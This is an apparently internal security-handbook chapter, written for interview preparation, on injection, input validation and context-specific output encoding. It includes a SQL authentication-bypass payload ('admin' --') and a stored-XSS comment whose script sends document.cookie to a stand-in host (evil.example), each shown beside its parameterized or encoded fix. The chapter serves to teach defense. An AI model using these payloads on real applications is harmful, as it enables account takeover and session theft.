---
title: "Injection, Input Validation, and Output Encoding"
slug: injection-input-validation-output-encoding
document_type: handbook-chapter
domain: 12-security
status: draft
version: 1.0
last_reviewed: 2026-09-04
topic_id: T-1305
mastery_levels_covered:
  - L1
  - L2
  - L3
  - L4
difficulty:
  - intermediate
target_levels:
  - senior
  - staff
prerequisites: []
related:
  - owasp-top-10-for-backend-services.md
  - ../06-databases/query-planning-and-explain-analyze.md
  - ../../study-packs/week-17/04-injection-input-validation-output-encoding.md
official_references:
  - https://owasp.org/www-community/attacks/SQL_Injection
  - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
source_history:
  - handbook/security/injection-input-validation-output-encoding.md
---

# Injection, Input Validation, and Output Encoding

> **Topic register:** T-1305 (Injection, input validation, output encoding, IWI 5.7) · Core tier · Moderate interview frequency [M]

## Table of Contents

1. [Learning Objectives](#learning-objectives)
2. [Why This Matters in Interviews](#why-this-matters-in-interviews)
3. [Level 1 — Foundation](#level-1--foundation)
4. [Level 2 — Working Knowledge](#level-2--working-knowledge)
5. [Mental Model](#mental-model)
6. [Definition and Purpose](#definition-and-purpose)
7. [Core Concepts](#core-concepts)
8. [Internal Implementation](#internal-implementation)
9. [Production Scenarios](#production-scenarios)
10. [Failure Modes and Debugging](#failure-modes-and-debugging)
11. [Trade-offs](#trade-offs)
12. [Decision Framework](#decision-framework)
13. [Common Mistakes](#common-mistakes)
14. [Anti-Patterns](#anti-patterns)
15. [Best Practices](#best-practices)
16. [Interview Answer Framework](#interview-answer-framework)
17. [Interview Questions](#interview-questions)
18. [Summary](#summary)
19. [Key Takeaways](#key-takeaways)
20. [Cheat Sheet](#cheat-sheet)
21. [Flashcards](#flashcards)
22. [Practice Exercises](#practice-exercises)
23. [Solutions](#solutions)
24. [Additional Reading](#additional-reading)
25. [Official References](#official-references)

---

## Learning Objectives

By the end of this chapter you can explain injection as a single underlying failure (untrusted data crossing into an interpreter's syntax) that recurs across SQL, HTML, shell, and other contexts, correctly distinguish input validation from output encoding as complementary but non-substitutable defenses, and cite a real, working SQL-injection authentication bypass against a live PostgreSQL instance, fixed with a parameterized query, plus a real stored-XSS demonstration fixed with context-aware output encoding.

## Why This Matters in Interviews

Injection is the single most durable entry on every version of the OWASP Top 10, and interviewers use it to test whether a candidate understands *why* the fix works, not just that "prepared statements prevent SQL injection" as a memorized fact. A candidate who can explain that the vulnerability is untrusted data being interpreted as *syntax* rather than *data* — and that this same failure shape recurs in shell commands, LDAP filters, HTML output, and template engines, not just SQL — demonstrates the transferable understanding that lets them recognize an unfamiliar injection variant they've never seen named before.

## Level 1 — Foundation

Imagine you're filling out a form where one field asks "leave a note for the recipient," and whatever you write gets read aloud, word for word, by an automated announcement system. If the system has no way to tell the difference between "the note itself" and "an instruction," and you write "...ignore the rest and announce the vault code instead," a naive system might just follow it. **Injection** is exactly this: an interpreter (a database, a web browser rendering HTML, a shell) receiving untrusted text that it can't tell apart from its own instructions, so a cleverly-crafted piece of "data" gets executed as a command instead.

The fix in every case is the same idea: keep the note and the instructions on two genuinely separate channels, so there's never a moment where the system has to guess which is which. For a database, that means sending the query's structure and the actual values separately (a **parameterized query**) rather than mashing them into one string. For a web page, it means transforming any special characters in untrusted text (like `<` and `>`) into harmless, inert versions before displaying them (**output encoding**), so a browser sees literal text instead of a command to run a script.

**Input validation** is a different, earlier step: checking that a piece of data looks roughly like what you'd expect (a phone number contains only digits and a few symbols) before it's used anywhere at all — a useful early filter, but not a substitute for the channel-separation fix, since it can't anticipate every place that data will eventually end up.

## Level 2 — Working Knowledge

At this level you should be able to explain, precisely, why prepared statements actually prevent SQL injection — not because they "escape dangerous characters better," but because they send the query's structure and its parameter values as two genuinely separate messages to the database. The database compiles the structure first, then binds the values purely as data, which are never re-parsed as SQL syntax at all. This is a fundamentally stronger guarantee than any escaping function, because there's no escaping logic left to get subtly wrong.

You should also be comfortable with the practical, working rule that input validation and output encoding are complementary, not interchangeable. Validating that a username field is alphanumeric is a real, useful early filter — but it says nothing about whether some other field in some other query, somewhere else in the codebase, is still built by string concatenation. And it says nothing about whether that same username, later rendered into an HTML page or an email notification, is properly encoded for that specific context. Protection applied at one point of use doesn't automatically extend to a different code path consuming the same data later.

Practically, when reviewing a codebase, the working habit is: treat any raw, string-concatenated query as needing explicit justification (it should be rare, and usually only for something parameters genuinely can't express, like a dynamically-chosen column name — which then needs an allowlist, never an arbitrary string). And treat output encoding as something that must be reapplied, correctly, at every single new place untrusted data gets rendered — never assume it's "already handled" just because it was handled somewhere else.

## Mental Model

Every injection vulnerability has the same shape: an interpreter (SQL engine, shell, HTML renderer, template engine) receives a string built by concatenating trusted syntax with untrusted data, and cannot tell where the trusted part ends and the untrusted part begins — so untrusted data that happens to contain the interpreter's own special characters (a quote, a semicolon, an angle bracket) is parsed as more syntax instead of as inert data. The fix is always the same shape too: keep data and syntax in genuinely separate channels, so the interpreter never has to guess — a parameterized SQL query sends the query structure and the parameter values separately over the wire; output encoding transforms special characters in untrusted data into their inert equivalents *before* they ever reach the HTML/JS interpreter, so there's nothing left to misinterpret as syntax.

## Definition and Purpose

**Injection** is a vulnerability class where untrusted input is incorporated into a command, query, or output stream in a way that lets it alter the intended structure (syntax) of that stream, rather than being treated purely as data. **Input validation** rejects or normalizes untrusted input against an expected shape (type, length, format, allowed character set) *before* it's used anywhere — a first line of defense that reduces the attack surface but is not, by itself, sufficient injection prevention. **Output encoding** transforms data into a form that is guaranteed inert in the specific context it's about to be rendered into (HTML body, HTML attribute, URL, JavaScript string, SQL parameter) — the defense that actually prevents injection at the point of use, regardless of what the input validation upstream did or didn't catch.

## Core Concepts

### Input validation and output encoding are complementary, not substitutable

Input validation happens once, at the system's boundary, and can reject obviously malformed input early (a username field that shouldn't contain SQL metacharacters at all, for instance) — but it cannot anticipate every context the data will eventually flow into, especially in a system where the same field gets rendered into HTML in one place, logged in another, and used in a SQL query in a third. Output encoding happens at each point of use, tailored to that specific context's syntax rules, and is the defense that actually matters at the moment an interpreter consumes the data — validation is a helpful early filter, not a substitute for encoding correctly at every consumption point.

### Parameterization (prepared statements) is the injection fix for SQL specifically, because it separates the channel, not because it "escapes" characters

A common misconception is that prepared statements work by escaping dangerous characters better than manual string-building. They actually work by sending the query structure and the parameter values as *separate* protocol messages to the database — the database compiles the query structure first, with placeholders, and only then binds the parameter values as pure data, which are never re-parsed as SQL syntax at all. This is a stronger guarantee than any escaping function, because there's no escaping logic to get subtly wrong.

### Output encoding must be context-specific — the same data may need different encoding depending on where it's rendered

Data rendered into an HTML body needs HTML-entity encoding (`<` becomes `&lt;`); the same data rendered into an HTML attribute, a URL query parameter, or a `<script>` block each has different special characters and different encoding rules. Using HTML-body encoding for a value placed inside a `<script>` block, for instance, does not prevent injection there — a JavaScript-context-aware encoder is needed instead. This is why general-purpose "sanitize this string" functions are a weaker mental model than "encode for the specific output context."

## Internal Implementation

**Real SQL injection authentication bypass** (`practice/java/week-17/injection/src/SqlInjectionDemo.java`, live PostgreSQL 16 container, real `users` table):

```
=== VULNERABLE login: username="admin' --" ===
  executed SQL: SELECT * FROM users WHERE username = 'admin' --' AND password_hash = 'anything'
  login succeeded (no valid password given)? true

=== FIXED login: same attacker input, PreparedStatement ===
  login succeeded? false  (username literally "admin' --" doesn't exist)

=== FIXED login: legitimate alice credentials ===
  login succeeded? true
```

The attacker's username `admin' --` closes the string literal early and comments out the rest of the query (`--` is PostgreSQL's line-comment syntax), so the password check never executes at all — the query as actually run by the database is `SELECT * FROM users WHERE username = 'admin'`, matching the real admin row unconditionally. The fixed version binds `admin' --` as a literal parameter value; PostgreSQL never re-parses it as SQL syntax, so it correctly fails to match any username (since no user is literally named `admin' --`).

**Real stored-XSS via naive HTML concatenation, fixed with output encoding** (`OutputEncodingDemo.java`):

```
=== VULNERABLE render: stored comment from an attacker ===
<div class="comment"><b>mallory</b>: nice post! <script>fetch('https://evil.example/steal?c='+document.cookie)</script></div>
Contains a live <script> tag that will execute in every viewer's browser: true

=== FIXED render: same stored comment, output-encoded ===
<div class="comment"><b>mallory</b>: nice post! &lt;script&gt;fetch(&#39;https://evil.example/steal?c=&#39;+document.cookie)&lt;/script&gt;</div>
Contains a live <script> tag? false  (the text is inert -- displayed as literal characters, not parsed as markup)
```

The vulnerable render concatenates the stored comment directly into the HTML response; any browser rendering that page executes the injected `<script>` tag as if it were the page author's own markup. The fixed render HTML-entity-encodes the comment text at the point of rendering — the exact same stored string, but now every special character (`<`, `>`, `'`) is transformed into its inert entity form, so the browser displays it as literal text rather than parsing it as markup.

## Production Scenarios

**A search feature builds a query by string-concatenating a user-supplied search term directly into a SQL `LIKE` clause, and passes a security review's automated SQL-injection scanner cleanly because the scanner only tests common attack patterns against common field names.** A manual review later finds the vulnerability is real but requires an attack pattern specific to how the search term is embedded (inside a `LIKE '%...%'` wildcard context, requiring `%` escaping in addition to quote-breaking). This illustrates that automated scanning is a useful but incomplete defense — the underlying architectural fix (parameterize the query, including correctly escaping `LIKE` wildcard characters as data rather than pattern syntax) closes the entire vulnerability class regardless of which specific attack pattern a scanner does or doesn't happen to test.

**A comment system correctly escapes comment text for HTML rendering, but a later feature adds comment text to an email notification's HTML body using a different rendering path that reuses raw comment data without the same encoding.** The original defense was correctly implemented at its original point of use, but output encoding is inherently per-context and per-consumption-point — a new consumer of the same untrusted data (the email-notification path) needs its own correct encoding, and doesn't automatically inherit the protection applied elsewhere. This is why centralizing rendering through a small number of well-tested encoding utilities, rather than reimplementing encoding logic at each new call site, matters operationally, not just for code cleanliness.

## Failure Modes and Debugging

- **Symptom: a security scanner or manual test successfully alters query logic via a form field.** Confirm whether the query is built via string concatenation anywhere on that code path, even if most of the query uses parameterization — a single concatenated fragment (often added later, by a different engineer, for a feature like dynamic sort-column selection) reopens the vulnerability even in an otherwise-parameterized codebase.
- **Symptom: user-supplied content renders correctly as plain text in one part of the application but executes as markup/script in another.** This is the signature of context-specific output encoding being applied inconsistently — encoding correctly implemented at the original render point does not automatically protect a newer consumer of the same underlying data.
- **Anti-pattern to rule out first when a "sanitization" function is reported as bypassed:** check whether the function is a generic blacklist-based filter (stripping known-bad patterns) rather than context-aware encoding — blacklist-based sanitization is a well-known class of bypassable defense, since it requires anticipating every dangerous pattern rather than making every character inert by construction.

## Trade-offs

Strict input validation (rejecting anything outside an expected format) reduces attack surface early and can improve data quality broadly, but risks false-positive rejections of legitimate input that doesn't fit an overly narrow expected pattern (a name field that rejects apostrophes, breaking legitimate names like "O'Brien"). Output encoding is more foundational and harder to bypass, but must be applied correctly and consistently at every single point of use — a single missed consumer of untrusted data reopens the vulnerability regardless of how well every other consumer is protected.

## Decision Framework

Apply input validation as an early, coarse filter calibrated to the field's actual legitimate range (reject a phone-number field containing SQL syntax, since no legitimate phone number needs it) — but never treat validation passing as sufficient evidence that downstream use is safe. Apply parameterized queries (never string-concatenated SQL) as a non-negotiable default for any database access, with zero exceptions for "this one field is probably safe." Apply context-specific output encoding at every single point where untrusted data is rendered into any interpreted format (HTML, JS, shell, LDAP), treating each new consumer of previously-validated data as needing its own correct encoding rather than assuming protection is inherited.

## Common Mistakes

- Believing input validation alone ("we reject any input containing a single quote") is sufficient injection prevention — it's a helpful early filter, not a substitute for parameterization or context-specific encoding at the point of use.
- Using a single general-purpose "sanitize" function for all output contexts, rather than context-specific encoding (HTML body vs. HTML attribute vs. JavaScript vs. URL each need different encoding rules).
- Assuming that because most of a codebase's queries are parameterized, the codebase is safe — a single concatenated fragment anywhere reopens the vulnerability.
- Conflating "escaping" with "parameterization" for SQL — prepared statements' security guarantee comes from separating the query structure and data channels entirely, not from escaping characters more thoroughly than a manual implementation would.

## Anti-Patterns

Building a custom blacklist-based input filter (stripping or rejecting specific "known-dangerous" substrings like `<script>` or `' OR '1'='1`) as the primary injection defense, rather than parameterization and context-specific output encoding — blacklists require anticipating every attack variant in advance and are routinely bypassed by encoding tricks, case variations, or entirely different attack patterns the blacklist's author didn't think to include.

## Best Practices

Default every database access path through an ORM or parameterized-query API, and treat any raw string-concatenated query as requiring explicit justification and review, not a routine implementation choice. Centralize output encoding through a small number of well-tested, context-specific encoding utilities (or a templating engine with encoding built in and enabled by default, like most modern web frameworks) rather than hand-rolling escaping logic at each render call site — this converts "did every developer remember to encode correctly" into "does the shared utility encode correctly," a much smaller and more reviewable surface.

## Interview Answer Framework

### 30-Second Answer

Injection is untrusted data being interpreted as syntax instead of data by an interpreter — SQL, shell, HTML, and others all share this same underlying failure shape. Input validation is an early, coarse filter; it's necessary but not sufficient. The actual defense is keeping data and syntax in genuinely separate channels: parameterized queries for SQL, context-specific output encoding for HTML/JS/URL rendering — applied at every single point of use, not once upstream.

### 2-Minute Answer

Definition: injection happens when untrusted input alters an interpreter's intended structure rather than being treated as pure data. Why it exists as a persistent risk: string concatenation is the most natural, obvious way to build a query or render output, and it's exactly the pattern that fails when the data contains the interpreter's own special characters. How the fix works: parameterized queries separate the query-structure and parameter-value channels at the protocol level, so there's no re-parsing to exploit; output encoding transforms special characters into inert equivalents before an interpreter ever sees them, tailored to the specific rendering context. One trade-off: input validation reduces attack surface early but risks false-positive rejections of legitimate input, and is never sufficient by itself. One production example: a real SQL-injection authentication bypass — the attacker username `admin' --` closes the query's string literal and comments out the password check entirely, granting access with any password; a parameterized version of the identical query correctly fails, since the malicious string is bound as a literal value rather than re-parsed as SQL.

### 10-Minute Deep Dive

Cover: injection as a single recurring failure shape across contexts, not a SQL-specific bug category; the real authentication-bypass evidence, including the exact mechanism (comment syntax truncating the query) and why parameterization closes it structurally rather than by pattern-matching; the real stored-XSS evidence and why context-specific output encoding (not a generic sanitizer) is the correct defense shape; the distinction between input validation (early, coarse, necessary-but-insufficient) and output encoding (per-context, per-consumption-point, the defense that actually matters); the production scenario of a new consumer (email notification) of already-"safe" data reopening the vulnerability, illustrating that encoding protection doesn't propagate automatically to new code paths; the blacklist-based-sanitization anti-pattern and why it's routinely bypassable.

### Whiteboard Explanation

Draw an interpreter box (label it "SQL engine" or "HTML renderer") receiving a single incoming arrow labeled "query/output string," built by concatenating a "trusted syntax" segment and an "untrusted data" segment drawn as adjacent puzzle pieces with no visible seam. Circle the seam and write "the interpreter can't tell where trusted ends and untrusted begins." Redraw the fix as two entirely separate arrows into the interpreter — one labeled "query structure (trusted)," one labeled "parameter values (data only, never re-parsed)" — to show the channel separation that parameterization provides.

### Production Example

A reporting feature lets users choose a sort column via a dropdown, implemented by concatenating the selected column name directly into an `ORDER BY` clause, since prepared-statement parameters can bind values but not identifiers like column names — a genuine limitation of parameterization that this specific feature runs into. The fix is not "fall back to string concatenation for this one case" but an explicit allowlist of valid column names, validated against the allowlist before being concatenated (identifier names, unlike values, sometimes legitimately require this pattern, but only when constrained to a known-safe, enumerable set — never accepting an arbitrary string).

### Trade-offs to Mention

Input validation reduces attack surface early but risks false-positive rejection of legitimate input and is never sufficient alone; output encoding must be reapplied correctly at every single point of use, meaning protection doesn't automatically propagate to new consumers of the same data.

### Common Candidate Mistakes

Describing prepared statements as "escaping quotes better"; using a single generic sanitizer for all output contexts instead of context-specific encoding; treating input validation as sufficient by itself.

### Typical Follow-Up Questions

"Prepared statements can't parameterize identifiers like table or column names — how would you handle a feature that lets users choose a sort column?" → validate the requested column name against an explicit allowlist of known-safe column names before using it, never accept an arbitrary string for that position. "What's the specific risk of a blacklist-based sanitizer over an allowlist/encoding-based approach?" → a blacklist must anticipate every dangerous pattern in advance and is routinely bypassed by encoding tricks or attack variants its author didn't think to include; encoding transforms every special character into an inert form by construction, requiring no pattern-anticipation at all.

### Senior-Level Expectations

Correctly explains why parameterization works (channel separation, not better escaping), and correctly distinguishes input validation from output encoding as complementary, non-substitutable defenses.

### Staff-Level Discussion

Recognizes that encoding protection is per-consumption-point and doesn't propagate to new code paths automatically, and factors this into architectural decisions — centralizing rendering/query-building through shared, well-tested utilities specifically to shrink the surface where a new consumer could reintroduce the vulnerability, rather than relying on every future engineer remembering the rule.

## Interview Questions

### Question 1

**A junior engineer says: "We're safe from SQL injection because we validate that the username field only contains alphanumeric characters before using it in a query." Evaluate this claim.**

**Expected answer:** input validation restricted to alphanumeric characters does meaningfully reduce the attack surface for *that specific field*, but it's not equivalent to being safe from SQL injection generally — it depends entirely on every field used in every query having similarly strict, correctly-implemented validation, and provides no protection at all if the query itself is still built via string concatenation for any field that isn't so tightly validated (or if the validation itself has a bug). The actual guarantee comes from parameterized queries, which don't depend on the character content of the input at all.

**Common mistakes:** accepting the validation-only claim as sufficient without probing whether every other field and every other query is equally protected.

**Follow-up questions:** "Does this validation alone protect a different query elsewhere in the codebase that uses the same username field without re-validating?" (No — validation at one point of entry doesn't propagate automatically to every later use.)

**Senior-level expectations:** correctly identifies that field-level validation is necessary-adjacent but not sufficient, and explains why.

**Staff-level expectations:** proposes parameterization as the actual guarantee and explains why it doesn't depend on the specific character content of the input at all, unlike validation.

### Question 2

**Explain, mechanically, why the SQL string `SELECT * FROM users WHERE username = 'admin' --' AND password_hash = 'anything'` grants access without a valid password.**

**Expected answer:** `--` is PostgreSQL's line-comment syntax; everything after it on that line, including the `AND password_hash = 'anything'` clause, is discarded by the SQL parser before the query is even evaluated. The database executes only `SELECT * FROM users WHERE username = 'admin'`, which matches the real admin row regardless of what password value was supplied.

**Common mistakes:** describing the attack vaguely ("it breaks out of the string") without identifying the specific comment-syntax mechanism that discards the password check.

**Follow-up questions:** "Would this specific attack pattern work identically against a database that uses a different comment syntax?" (The exact syntax varies by database — MySQL also supports `--` with a following space, or `#`; the underlying principle — closing the string literal and discarding the rest of the query — is what transfers, not the specific character sequence.)

**Senior-level expectations:** correctly explains the comment-syntax mechanism precisely.

**Staff-level expectations:** generalizes the underlying principle (string-literal closure plus syntax truncation) beyond the specific `--` character sequence shown.

## Summary

Injection is a single recurring failure shape — untrusted data crossing into an interpreter's syntax rather than staying data — that manifests across SQL, HTML, shell commands, and other contexts. Input validation is a necessary but insufficient early filter; the actual defense is keeping data and syntax in separate channels: parameterized queries for SQL (a protocol-level channel separation, not better escaping) and context-specific output encoding for rendered output (applied at every single point of use, since protection doesn't propagate automatically to new consumers of the same data). Both defenses were demonstrated with real, working code: a genuine SQL-injection authentication bypass against a live PostgreSQL instance, closed by a parameterized query; and a genuine stored-XSS payload, neutralized by context-aware HTML output encoding.

## Key Takeaways

- Injection is one failure shape (untrusted data treated as syntax) recurring across SQL, HTML, shell, and other interpreted contexts — not a SQL-specific bug category.
- Prepared statements work by separating the query-structure and parameter-value channels at the protocol level, not by escaping characters more thoroughly.
- Input validation is necessary but not sufficient; output encoding at the actual point of use is the defense that matters, and must be reapplied correctly at every new consumer of the same data.
- Output encoding must be context-specific (HTML body vs. attribute vs. JavaScript vs. URL) — a generic "sanitize" function is a weaker model than "encode for this specific rendering context."
- Blacklist-based sanitization is a well-known, routinely-bypassable anti-pattern; allowlists and context-aware encoding are structurally stronger because they don't depend on anticipating every attack variant.

## Cheat Sheet

| Context | Correct defense | Wrong tool trap |
|---|---|---|
| SQL query | Parameterized query / prepared statement | String concatenation, even with "escaping" |
| SQL identifier (column/table name) | Allowlist validation (parameters can't bind identifiers) | Accepting an arbitrary string |
| HTML body | HTML-entity encoding | Generic/no sanitization |
| HTML attribute, JS string, URL | Context-specific encoding (different rules per context) | Reusing HTML-body encoding everywhere |
| Shell command | Avoid shelling out to untrusted input entirely; use APIs instead | String-concatenated shell commands |

## Flashcards

**Q: Why do prepared statements prevent SQL injection?**
A: They send the query structure and parameter values as separate protocol messages — the database compiles the structure first and binds values as pure data, never re-parsing them as SQL syntax.

**Q: Is input validation alone sufficient to prevent injection?**
A: No — it's a necessary early filter but not sufficient by itself; output encoding or parameterization at the actual point of use is the defense that matters.

**Q: Why is a generic "sanitize this string" function a weaker model than context-specific output encoding?**
A: Different rendering contexts (HTML body, HTML attribute, JavaScript, URL) have different special characters and different encoding rules — encoding correct for one context may not be correct, or even present, for another.

## Practice Exercises

1. Reproduce `SqlInjectionDemo.java` against your own local PostgreSQL instance, and try at least one additional injection payload beyond `admin' --` (e.g., a UNION-based payload attempting to extract data from a different table) against both the vulnerable and fixed handlers.
2. Reproduce `OutputEncodingDemo.java` and extend it with a second encoding function for the URL-attribute context (encoding a value meant to be placed inside an `href="..."` attribute) — confirm HTML-body encoding alone is insufficient for this context (e.g., it doesn't prevent a `javascript:` URI scheme from being injected into an `href`).

## Solutions

1. A UNION-based payload against the vulnerable handler (e.g., closing the query and appending a `UNION SELECT` against another table) succeeds identically to the demonstrated bypass, for the same underlying reason; against the fixed `PreparedStatement` version it fails identically, since the entire payload is bound as a single literal value regardless of its internal structure.
2. HTML-entity encoding alone does not neutralize a `javascript:alert(1)` value placed inside an `href` attribute, since the browser still parses it as a URI scheme, not as HTML markup — this requires validating the URL scheme against an allowlist (e.g., only `http:`/`https:`/`mailto:`) in addition to any HTML-attribute encoding.

## Additional Reading

- [OWASP Cheat Sheet Series — Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)

## Official References

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
